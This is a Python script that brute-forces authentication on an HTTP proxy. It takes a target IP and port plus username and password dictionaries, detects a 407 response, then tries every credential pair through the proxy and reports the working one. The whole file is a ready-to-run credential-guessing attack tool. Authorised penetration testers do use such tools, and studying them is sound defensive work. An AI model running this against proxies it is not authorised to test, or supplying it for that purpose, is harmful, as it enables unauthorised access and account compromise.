#!/usr/bin/python
'''
	Author : K. BEKKOUCHE 
	Web Site : www.zakansecurity.com
	Version: 1.0
	Date: 04/06/2016
'''
#====================================================================

from optparse import OptionParser
import sys
import requests

#====================================================================

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class ProxyBF():

	def __init__(self):

		self.version = "1.0"
		self.info = 'Simple Proxy Auth Brute Forcer - %s, By K. BEKKOUCHE.' % self.version

		self.host = ""
		self.port = 3128
		self.code = 407
		self.ufile = ""
		self.pfile = ""

	#===
	def startup(self):

		usage = '%s [ -i Proxy IP ] [ -p Proxy port ] [ -c CODE ][ -U Usernames File ] [ -P Passwords File ]' % sys.argv[0]

		oparser = OptionParser(version = self.info, usage = usage)
		oparser.add_option('-i',  dest = 'host', help = 'Ip/Hostname of the proxy to brute force.')
		oparser.add_option('-p',  dest = 'port', help = 'Port of the proxy (default: 3128).', default = 3128)
		oparser.add_option('-c',  dest = 'code', help = 'HTTP Code for Proxy Authentication Required (default: 407).', default = 407)
		oparser.add_option('-U', dest='ufile', help = 'Usernames Dictionary.', default = False)
		oparser.add_option('-P', dest='pfile', help = 'Passwords Dictionary.', default = False)

		(options, args) = oparser.parse_args()
	
		if not options.host or not options.ufile or not options.pfile:
			oparser.print_help()
			sys.exit(1)

		self.host = options.host
		if options.port: self.port = int(options.port)
		if options.code: self.code = int(options.code)
		self.ufile = options.ufile
		self.pfile = options.pfile

	#===
	def check_proxy_auth(self):

		proxy = { "http" : "%s:%d" % ( self.host, self.port) }

		print ("[*] Checking for Proxy authentication.")
		ret = requests.get ("http://www.badsite.com", proxies=proxy)

		#print ret.status_code
		#print ret.content
		#print ret.headers

		if ret.status_code == self.code: 

			print (bcolors.WARNING + bcolors.BOLD + "[-]" + bcolors.ENDC + " Proxy is protected by authentication, by returning %s code !" % ret.status_code)
			return 0

		else : 
			print ("[+] No need of auth.")
			return 1

	#===
	def proxy_auth_bf(self):

		print ("[*] Brute forcing the Proxy.")

		found = False

		try:

			with open (self.ufile) as fusers:

				for user in fusers:

					with open (self.pfile) as fpasswords:

						for passwd in fpasswords:

							proxy = { "http" : "http://%s:%s@%s:%d" % ( user.rstrip(), passwd.rstrip(), self.host, self.port) }
							#print proxy

							try :
								ret = requests.get ("http://www.zakansecurity.com", proxies=proxy)
							except err:
								print (bcolors.FAIL + bcolors.BOLD + "[-]" + bcolors.ENDC + "Error %s" % err)
								pass

							if ret.status_code != self.code:

								print (bcolors.OKGREEN + bcolors.BOLD + "[+] SUCCESS : Proxy = %s:%d, Status Code = %d, User = %s, Passwd = %s" % (self.host, self.port, ret.status_code, user.rstrip(), passwd.rstrip() ) + bcolors.ENDC )
								print (bcolors.OKBLUE + bcolors.BOLD + "[+] Username/Password pair is found : [ User = %s, Passwd = %s ] " % ( user.rstrip(), passwd.rstrip() ) + bcolors.ENDC )
								found = True
								break
							else:

								print (bcolors.FAIL + "[-]" + bcolors.ENDC + " FAIL : Proxy = %s:%d, Status Code = %d, User = %s, Passwd = %s" % (self.host, self.port, ret.status_code, user.rstrip(), passwd.rstrip() ))

					if found: break
		except KeyboardInterrupt:
			print (bcolors.FAIL + "[-]" + bcolors.ENDC + "The program is intrrupted !")
			return 0

#====================================================================
if __name__ == '__main__':

	pbf = ProxyBF()
	
	pbf.startup()

	print ("[*] Starting brute forcing.")

	if not pbf.check_proxy_auth(): pbf.proxy_auth_bf()

	print ("[*] End.")

#====================================================================